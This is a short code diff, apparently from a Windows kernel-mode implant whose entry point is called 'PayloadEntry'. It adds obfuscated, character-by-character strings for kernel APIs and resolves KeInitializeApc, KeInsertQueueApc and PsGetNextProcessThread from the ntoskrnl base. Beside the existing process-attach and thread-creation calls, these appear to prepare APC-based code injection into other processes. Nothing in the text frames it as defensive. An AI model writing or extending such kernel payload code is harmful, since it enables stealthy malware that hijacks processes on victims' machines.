@@ -145,6 +145,9 @@ void __attribute__((section(".text"))) PayloadEntry(
     char s_ExFreePool[] = {'E','x','F','r','e','e','P','o','o','l',0};
     char s_KeDelayExecutionThread[] = {'K','e','D','e','l','a','y','E','x','e','c','u','t','i','o','n','T','h','r','e','a','d',0};
     char s_ZwCreateThreadEx[] = {'Z','w','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0};
+    char s_KeInitializeApc[] = {'K','e','I','n','i','t','i','a','l','i','z','e','A','p','c',0};
+    char s_KeInsertQueueApc[] = {'K','e','I','n','s','e','r','t','Q','u','e','u','e','A','p','c',0};
+    char s_PsGetNextProcessThread[] = {'P','s','G','e','t','N','e','x','t','P','r','o','c','e','s','s','T','h','r','e','a','d',0};
 
     Ctx.Api.KeStackAttachProcess = (fn_KeStackAttachProcess)ResolveKernelApi(NtoskrnlBase, s_KeStackAttachProcess);
     Ctx.Api.KeUnstackDetachProcess = (fn_KeUnstackDetachProcess)ResolveKernelApi(NtoskrnlBase, s_KeUnstackDetachProcess);
@@ -157,6 +160,9 @@ void __attribute__((section(".text"))) PayloadEntry(
     Ctx.Api.ExFreePool = (fn_ExFreePool)ResolveKernelApi(NtoskrnlBase, s_ExFreePool);
     Ctx.Api.KeDelayExecutionThread = (fn_KeDelayExecutionThread)ResolveKernelApi(NtoskrnlBase, s_KeDelayExecutionThread);
     Ctx.Api.ZwCreateThreadEx = (fn_ZwCreateThreadEx)ResolveKernelApi(NtoskrnlBase, s_ZwCreateThreadEx);
+    Ctx.Api.KeInitializeApc = (fn_KeInitializeApc)ResolveKernelApi(NtoskrnlBase, s_KeInitializeApc);
+    Ctx.Api.KeInsertQueueApc = (fn_KeInsertQueueApc)ResolveKernelApi(NtoskrnlBase, s_KeInsertQueueApc);
+    Ctx.Api.PsGetNextProcessThread = (fn_PsGetNextProcessThread)ResolveKernelApi(NtoskrnlBase, s_PsGetNextProcessThread);
 
     /* count resolved APIs */
     {
